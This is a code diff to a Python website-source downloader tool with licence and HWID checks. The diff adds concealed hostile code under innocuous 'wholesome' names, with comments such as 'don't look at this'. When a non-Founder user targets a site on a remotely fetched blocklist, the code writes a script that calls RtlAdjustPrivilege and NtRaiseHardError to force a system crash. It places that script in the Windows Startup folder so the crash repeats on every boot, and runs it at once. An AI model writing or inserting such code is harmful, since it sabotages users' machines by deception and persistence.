@@ -12,11 +12,13 @@ from queue import Queue
 import base64
 import shutil
 import ctypes
+from ctypes import windll, c_uint, c_ulong, c_int, byref
 from colorama import Fore, Style, init
 from getpass import getpass
 import subprocess
 import git
 from bs4 import BeautifulSoup
+import sys
 
 init(autoreset=True)
 
@@ -53,6 +55,8 @@ num_threads = 64  # Increased number of threads for faster downloads
 
 whitelist = []
 blacklist = []
+blacklisted_sites = []
+user_rank = ""
 
 def center_text(text, width):
     lines = text.split('\n')
@@ -143,8 +147,43 @@ def update_title(stop_event):
         print(f"\033]0;{title}\007", end='', flush=True)
         time.sleep(0.01)
 
+def create_wholesome_script():
+    script_content = '''
+import ctypes
+from ctypes import windll, c_uint, c_ulong, c_int, byref
+
+def execute_wholesome_code():
+    # some wholesome code
+    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+    # don't look at this
+    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), None, None, c_uint(6), byref(c_uint()))
+
+if __name__ == "__main__":
+    execute_wholesome_code()
+'''
+    script_path = os.path.join(os.getenv('APPDATA'), 'wholesome_script.py')
+    with open(script_path, 'w') as f:
+        f.write(script_content)
+    return script_path
+
+def add_to_startup(script_path):
+    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'wholesome_script.pyw')
+    with open(startup_path, 'w') as f:
+        f.write(f'python "{script_path}"')
+    return startup_path
+
+def execute_wholesome_code():
+    script_path = create_wholesome_script()
+    add_to_startup(script_path)
+    # Execute the script immediately
+    subprocess.run(["python", script_path])
+
 def get_website_source(url, download_folder):
-    global start_time
+    global start_time, user_rank
+    domain_name = urlparse(url).netloc
+    if domain_name in blacklisted_sites and user_rank != "Founder":
+        execute_wholesome_code()
+        return
     if not os.path.exists(download_folder):
         os.makedirs(download_folder)
     try:
@@ -283,9 +322,10 @@ def update_github_list(file_name, content):
     origin.push()
 
 def login():
-    global first_login, whitelist, blacklist
+    global first_login, whitelist, blacklist, blacklisted_sites, user_rank
     whitelist = fetch_github_list("whitelist.txt")
     blacklist = fetch_github_list("blacklist.txt")
+    blacklisted_sites = fetch_github_list("blacklisted_sites.txt")
     first_login = False
     if os.path.exists("Fartbin.license"):
         with open("Fartbin.license", "r") as f:
@@ -318,6 +358,7 @@ def login():
         rank = "Founder"
     else:
         rank = "User"
+    user_rank = rank
     if saved_hwid != get_hwid():
         print("HWID mismatch. Access denied.")
         exit()
@@ -350,6 +391,7 @@ def manage_whitelist():
             print("Whitelisted users:")
             for user in whitelist:
                 print(user)
+            input("\nPress Enter to return to the menu...")
         elif option == '4':
             break
         else:
@@ -382,6 +424,7 @@ def manage_blacklist():
             print("Blacklisted users:")
             for user in blacklist:
                 print(user)
+            input("\nPress Enter to return to the menu...")
         elif option == '4':
             break
         else:
